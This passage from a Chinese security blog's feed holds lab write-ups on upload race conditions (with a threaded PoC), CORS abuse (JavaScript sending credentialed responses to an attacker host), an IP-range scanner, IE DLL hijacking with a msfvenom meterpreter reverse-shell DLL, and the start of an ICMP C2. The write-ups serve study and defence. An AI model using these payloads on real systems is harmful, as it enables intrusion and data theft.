rel="noopener">那些年挖过的 SRC 之我是捡漏王 - 链闻 ChainNews</a></p><p><b>0x03与本文无关的中二语句</b><br>这是一个中二的语句与本文无关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接受你的赠礼，必以死亡作为回赠</span><br><span class="line">                                            ---《鬼泣5-维吉尔》</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Conditional Competitive Learning</title>
      <link href="/posts/2d4f21a3.html"/>
      <url>/posts/2d4f21a3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>准备上学，抽时间学了条件竞争并做了笔记<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181109/eefcba0df71b4ca18385a0152f51106a.jpeg" alt="eefcba0df71b4ca18385a0152f51106a.jpeg"></p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p><b>0x00介绍</b><br>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含webshell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作)，攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击</p><p><b>0x01漏洞一般出现的位置</b><br>SRC好像都没见过，一般出现在CTF题吧<br>就是允许任意文件上传，但是会判断是否为webshell。更简洁的来说就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先将文件上传到指定目录然后在判断是否为webshell，是的话在删除。攻击者可以利用这段时间差来进行生成另一个shell。</span><br><span class="line">一般存在条件竞争的上传文件后，在短暂时间内发现可以访问。可是后面就被删了，这就有：条件竞争</span><br></pre></td></tr></table></figure></p><p><b>0x02实验</b><br>存在漏洞的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;条件竞争&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"demo.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> na=<span class="string">"submit"</span> value=<span class="string">"上传"</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件上传错误"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传的文件名:"</span> . $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型:"</span> . $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小:"</span> . $_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件临时存储位置"</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $demo=explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $hz=end($demo);</span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> ($hz!=<span class="string">'jpg'</span>)&#123;</span><br><span class="line">            unlink(<span class="string">'upload/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"发现webshell，已删除"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>poc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'</span>&#125;</span><br><span class="line">    rqt=requests.get(url=url,headers=headers)</span><br><span class="line">    s+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'[+] 已请求:&#123;&#125;次'</span>.format(s))</span><br><span class="line">    rqt=requests.get(url=<span class="string">'http://127.0.0.1/jinz/upload/xxx.php'</span>,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> rqt.status_code==<span class="number">200</span>:</span><br><span class="line">        print(<span class="string">'[+] shell上传成功'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    urls=<span class="string">'http://127.0.0.1/jinz/upload/xx.php'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        t=threading.Thread(target=demo,args=(urls,))</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure></p><p>  <img src="https://s2.ax1x.com/2019/03/24/AYQxqH.md.png" alt=""></p><p>  <img src="https://s2.ax1x.com/2019/03/24/AYlSZd.md.png" alt="AYlSZd.md.png"></p><p>  <img src="https://s2.ax1x.com/2019/03/24/AYlpdA.md.png" alt="AYlpdA.md.png"></p><p>  <b>0x003修复</b><br>  针对此漏洞修复是，要判断是否为允许后缀在上传的过程判断，不要上传完毕才判断<br>  对上传后的文件进行重命名</p><p>  转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cross-domain Vulnerability Learning</title>
      <link href="/posts/f7db9d16.html"/>
      <url>/posts/f7db9d16.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久没更博客了。。最近手扭到了，原因是某领导来我们学校检查。到男生宿舍后面发现一堆烟头，说到这里我tm服了。。砸这么牛皮= =。吸完就往下扔，后来晚上总宿管全员检查。我们宿舍去开会的偷偷发了个短信给我们，下床双手撑着飞上墙壁看看有没有打火机。。。然后下来时手就肿了。。</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20181109/eefcba0df71b4ca18385a0152f51106a.jpeg" alt=""></p><h4 id="CORS跨域读取学习"><a href="#CORS跨域读取学习" class="headerlink" title="CORS跨域读取学习"></a>CORS跨域读取学习</h4><p><b>0x00同源策略</b><br>SOP同源策略，该策略是浏览器的一个安全基操，如果没有同源策略，那么你打开了一个合法网站，又打开了一恶意网站。恶意网站的脚本能够随意的操作合法网站可操作资源，没有任何限制。</p><p>同源策略介绍:<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener">Same-origin policy - Wikipedia</a><br>浏览器同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读取读写对方的资源。那么何为同源：<br>|协议|域名|端口|是否同源<br>|-|-|-|-|<br>|相同|相同|相同|是<br>|不同|相同|相同|否<br>|相同|相同|不相同|否</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1539004/q2owt35awt.jpeg?imageView2/2/w/1620" alt=""></p><p>一个最好的例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你在本地手动远程读取百度的logo，以读取到的二进制数据为准。很快你就会发现不行</span><br><span class="line">这都是同源策略</span><br></pre></td></tr></table></figure></p><blockquote><p>CORS，跨域资源共享（Cross-origin resource sharing），是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。</p></blockquote><p><b>0x01跨域访问的一些场景</b></p><blockquote><p>1.比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。<br>2.程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。<br>3.电商网站想通过用户浏览器加载第三方快递网站的物流信息。<br>4.子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</p></blockquote><p><b>0x03CORS漏洞的攻击流程</b><br>Access-Control-Allow-Origin:*<br>Access-Control-Allow-Credentials:true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过指定：Access-Control-Allow-Origin允许那些来源可以跨域读取本站的资源，当Access-Control-Allow-Origin为默认的时候。允许任意来源来访问本站的资源，那么就导致了跨域读取</span><br><span class="line"></span><br><span class="line">当站点没有指定Access-Control-Allow-Origin的时候，用户访问恶意站点的脚本，恶意站点的脚本请求站点。会被浏览器的同源策略默认拦截</span><br><span class="line"></span><br><span class="line">当站点设置了Access-Control-Allow-Origin:*，用户访问恶意站点的脚本，恶意站点的脚本请求站点。浏览器的同源策略不起作用。因为被请求的站点允许任何来源跨域读取本站内容</span><br></pre></td></tr></table></figure></p><p>攻击者手法：<br>攻击者利用cors漏洞把A.com的orgin改成接收用户信息的在线脚本B.com，然后生成一个链接引诱受害者去点击，如果受害者正好登录了A.com 并且点击了这个链接，则会把cookie发送到B.com</p><p>实例：<br>物理机win7:<a href="http://www.a.com" target="_blank" rel="noopener">www.a.com</a><br>Kali:<a href="http://www.b.com" target="_blank" rel="noopener">www.b.com</a></p><p><a href="http://www.a.com/cors/a.php" target="_blank" rel="noopener">www.a.com/cors/a.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'demo'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"欢迎管理员登录"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'你好,游客'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'user'</span>]==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        setcookie(<span class="string">'demo'</span>,<span class="string">'1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="http://www.b.com/demo.html" target="_blank" rel="noopener">www.b.com/demo.html</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function loadXMLDoc()</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="undefined">    var xhr1;</span></span><br><span class="line"><span class="undefined">    var xhr2;</span></span><br><span class="line"><span class="undefined">    if(window.XMLHttpRequest)</span></span><br><span class="line"><span class="undefined">    &#123;</span></span><br><span class="line"><span class="undefined">        xhr1 = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">        xhr2 = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    else</span></span><br><span class="line"><span class="undefined">    &#123;</span></span><br><span class="line"><span class="undefined">        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");</span></span><br><span class="line"><span class="undefined">        xhr2= new ActiveXObject("Microsoft.XMLHTTP");</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    xhr1.onreadystatechange=function()</span></span><br><span class="line"><span class="undefined">    &#123;</span></span><br><span class="line"><span class="undefined">        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response</span></span><br><span class="line"><span class="undefined">        &#123;</span></span><br><span class="line"><span class="undefined">            var datas=xhr1.responseText;</span></span><br><span class="line"><span class="undefined">            xhr2.open("POST","http://www.b.com/save.php","true");</span></span><br><span class="line"><span class="undefined">            xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");</span></span><br><span class="line"><span class="undefined">            xhr2.send("T1="+escape(datas));      </span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    xhr1.open("GET","http://www.a.com/cors/login.php","true") //request user page.</span></span><br><span class="line"><span class="undefined">    xhr1.withCredentials = true;        //request with cookie</span></span><br><span class="line"><span class="undefined">    xhr1.send();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">loadXMLDoc();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>login.php没有设置Access-Control-Allow-Origin<br>测试如下：<br>自动帮我们设置了origin头<br><img src="https://s2.ax1x.com/2019/03/23/AJg1P0.md.png" alt="AJg1P0.md.png"></p><p>当我们放包，继续让浏览器执行的时候</p><p>(浏览器阻止了跨域读取)<br><img src="https://s2.ax1x.com/2019/03/23/AJgaZ9.md.png" alt="AJgaZ9.md.png"></p><p>在login.php设置Access-Control-Allow-Origin<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin: http://b.com"</span>);</span><br><span class="line">header(<span class="string">"Access-Control-Allow-Credentials: true"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'demo'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"欢迎管理员登录"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'你好,游客'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'user'</span>]==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        setcookie(<span class="string">'demo'</span>,<span class="string">'1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>重新请求一下,发现返回的响应里面有（Access-Control-Allow-Origin）<br>PS:在浏览器执行下一步执行用burp抓包重放是可以看到响应结果的<br><img src="https://s2.ax1x.com/2019/03/23/AJRw36.png" alt="AJRw36.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin指是允许访问的源</span><br><span class="line">Access-Control-Allow-Credentials指的是允许带上cookie访问资源</span><br></pre></td></tr></table></figure></p><p>最后结果：<br><img src="https://s2.ax1x.com/2019/03/23/AJWSrF.png" alt="AJWSrF.png"></p><p><img src="https://s2.ax1x.com/2019/03/23/AJROCq.png" alt="AJROCq.png"></p><p>这里要注意的是，我们也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。<br><img src="https://s2.ax1x.com/2019/03/23/AJRsDe.png" alt="AJRsDe.png"></p><p>实际上挖掘跨域资源共享的要点就是：见到有origin请求返回的响应有Access-Control-Allow-Origin，尝试修改Origin头为自己的接收地址就行，详细看下面的secqun的文章。</p><p><b>0x04总结</b><br>实战挖SRC例子：<br><a href="https://secquan.org/Notes/1068983" target="_blank" rel="noopener">secqun-前端跨域资源共享</a><br>遨游浏览器没有做同源策略<br><a href="http://www.anquan.us/static/bugs/wooyun-2015-0155672.html" target="_blank" rel="noopener">Maxthon for mac 获取保存的密码/跨域信息读取/任意文件写入 | WooYun-2015-155672 | WooYun.org</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>country IP scan</title>
      <link href="/posts/d87b7fc4.html"/>
      <url>/posts/d87b7fc4.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>在学校搜索东西的时候，发现了一个可以获取全球国家指定IP范围的工具。感觉不错顺手就爬了然后发现可以利用这范围的IP干一些huai事（滑稽）<br><img src="https://i1.hoopchina.com.cn/blogfile/201609/12/BbsImg14736650442813_960x528.jpg?x-oss-process=image/resize,w_800/format,webp" alt="format,webp"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><hr><p>思路如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.先抓取指定全球国家代号（图1）</span><br><span class="line">2.随便点个国家可以看到全部IP范围，很直男（图2）</span><br><span class="line">3.获取IP开始范围和结束范围，使用正则匹配IP的4个位置，然后生成IP范围列表（图3）</span><br><span class="line">4.然后就是指定端口扫描</span><br><span class="line">5.上网找个站爬了用来IP反查域名</span><br><span class="line">6.调用shodan API来搜索IP</span><br></pre></td></tr></table></figure></p><p>图1<br><img src="https://s2.ax1x.com/2019/03/15/AVGXb4.png" alt="AVGXb4.png"></p><p>图2<br><img src="https://s2.ax1x.com/2019/03/15/AVJkrD.png" alt="AVJkrD.png"></p><p>图3<br><img src="https://s2.ax1x.com/2019/03/15/AVJaR0.md.png" alt="AVJaR0.md.png"></p><p>生成IP范围的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">start=<span class="string">'1.1.1.1'</span></span><br><span class="line">stop=<span class="string">'255.255.255.255'</span></span><br><span class="line">zz=re.findall(<span class="string">'[0-255]&#123;1,&#125;'</span>,start)</span><br><span class="line">zz_s=re.findall(<span class="string">'[0-255]&#123;1,&#125;'</span>,stop)</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(int(zz[<span class="number">0</span>]),int(zz_s[<span class="number">0</span>]),<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(int(zz[<span class="number">1</span>]),int(zz_s[<span class="number">1</span>]),<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(int(zz[<span class="number">2</span>]),int(zz_s[<span class="number">2</span>]),<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> range(int(zz[<span class="number">3</span>]),int(zz_s[<span class="number">3</span>]),<span class="number">1</span>):</span><br><span class="line">                ip=<span class="string">'&#123;&#125;.&#123;&#125;.&#123;&#125;.&#123;&#125;'</span>.format(q,b,c,r,)</span><br><span class="line">                print(ip)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/03/15/AVJ5LD.png" alt=""></p><p>测试结果：<br><img src="https://s2.ax1x.com/2019/03/14/AALA4e.md.gif" alt=""></p><p>如果gif动不了的话就看：<a href="https://imgchr.com/i/AALA4e" target="_blank" rel="noopener">ipscan - 路过图床</a></p><p>仓库地址：<a href="https://github.com/422926799/Ipscan" target="_blank" rel="noopener">GitHub - 422926799/Ipscan</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IEdll hijacking</title>
      <link href="/posts/c1ab089d.html"/>
      <url>/posts/c1ab089d.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天下午原本是想复现这篇文章里面的<a href="https://egre55.github.io/system-properties-uac-bypass/" target="_blank" rel="noopener">UAC Bypass via SystemPropertiesAdvanced.exe and DLL Hijacking – egre55 – thoughts on security</a> DLL劫持。没想到我在WIndows Server 2008 R2测试的时候发现IE的DLL劫持<br><img src="http://img2.ali213.net/picfile/News/2015/07/19/2015071941728151.jpg" alt="2015071941728151.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>环境：windows Server 2008 R2<br>IE版本：IE 7</p><p><img src="https://s2.ax1x.com/2019/03/04/kOTCcV.png" alt="kOTCcV.png"></p><p>IE文件夹里面原来的样子：<br><img src="https://s2.ax1x.com/2019/03/04/kOTn91.png" alt="kOTn91.png"></p><p>先配置好Procmon<br><img src="https://s2.ax1x.com/2019/03/04/kOTagP.png" alt="kOTagP.png"></p><p>重启Procmon然后打开IE，找到credssp.dll<br><img src="https://s2.ax1x.com/2019/03/04/kOTLgx.md.png" alt="kOTLgx.md.png"></p><p>当时我是抱着一试的心态，用msfvenom生成了个dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=&quot;calc.exe&quot; -f dll &gt; credssp.dll</span><br></pre></td></tr></table></figure></p><p>然后放入到IE的文件夹里，然后重启IE<br><img src="https://s2.ax1x.com/2019/03/04/kO7F2t.md.png" alt="kO7F2t.md.png"></p><p>测试结果：<br><img src="https://s2.ax1x.com/2019/03/04/kO7Na4.gif" alt="kO7Na4.gif"></p><p>再次用Procmon分析<br>发现注册表会找这个DLL，如果找到了就执行<br><img src="https://s2.ax1x.com/2019/03/04/kO74zt.md.png" alt="kO74zt.md.png"></p><p>credssp.dll成功被IE执行<br><img src="https://s2.ax1x.com/2019/03/04/kO7Oij.md.png" alt="kO7Oij.md.png"></p><p>msfvenom生成反弹meterpreter的dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f dll &gt; credssp.dll</span><br></pre></td></tr></table></figure></p><p>替换掉那个弹CALC的dll</p><p><img src="https://s2.ax1x.com/2019/03/04/kOHQTe.png" alt="kOHQTe.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kOHt6P.gif" alt="kOHt6P.gif"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Implementation of ICMP C2</title>
      <link href="/posts/eac90672.html"/>
      <url>/posts/eac90672.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>之前在学校写了一个ICMP的远控，现在来说一下当初写的思路<br><img src="http://p3.pstatp.com/large/pgc-image/15229176406623ca48a181b" alt="15229176406623ca48a181b"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p>windows安装scapy:<a href="https://www.cnblogs.com/qingkongwuyun/p/8508733.html" target="_blank" rel="noopener">Windows上安装scapy - 晴空无云 - 博客园</a></p><p>1.首先你得确定你这个远控有啥功能，你要怎么去实现。通过什么协议来实现，数据包的交互过程是？<br>2.数据在传送过程中会遇到什么问题？数据包过大会不会发送不了，或者只发送一半？<br>3.是否要对传输的过程进行加密</p><p>我这里使用的协议是ICMP，使用scapy来实现ICMP头，然后使用Padding来带入我要发送的值<br>例如：</p><p>server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">class demo:</span><br><span class="line">    def __init__(self,eth,dst,src):</span><br><span class="line">        self.eth=eth</span><br><span class="line">        self.dst=dst</span><br><span class="line">        self.src=src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def server(self,data):</span><br><span class="line">        a= IP(ttl=10, dst=self.dst, src=self.src) / ICMP(type=&quot;echo-request&quot;) / Padding(load=&apos;&#123;&#125;&apos;.format(data))</span><br><span class="line">        send(a,count=1)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d=demo(eth=&apos;Realtek RTL8188EU Wireless LAN 802.11n 